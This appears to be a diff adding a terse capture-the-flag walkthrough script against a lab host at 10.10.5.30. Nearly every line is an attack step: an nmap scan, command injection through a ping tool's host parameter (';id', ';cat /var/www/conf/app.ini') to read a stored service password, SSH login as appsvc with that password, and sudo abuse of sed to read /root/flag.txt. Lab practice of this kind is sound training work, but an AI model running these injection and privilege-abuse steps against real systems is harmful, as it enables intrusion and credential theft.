@@ -1,0 +1,16 @@
+## find the site and the ping tool
+nmap -sV 10.10.5.30
+curl -s http://10.10.5.30/
+curl -s 'http://10.10.5.30/tools/ping?host=127.0.0.1'
+## the tool runs our input: add ;id to run a second command as the web account
+curl -s 'http://10.10.5.30/tools/ping?host=127.0.0.1;id'
+## look around and read the config with the service password
+curl -s 'http://10.10.5.30/tools/ping?host=x;ls -la /var/www/conf'
+curl -s 'http://10.10.5.30/tools/ping?host=x;cat /var/www/conf/app.ini'
+## sign in as appsvc with that password and take the user flag
+ssh -o StrictHostKeyChecking=accept-new appsvc@10.10.5.30
+{{SVCPW}}
+cat flag.txt
+sudo -l
+sudo sed -n p /root/flag.txt
+exit
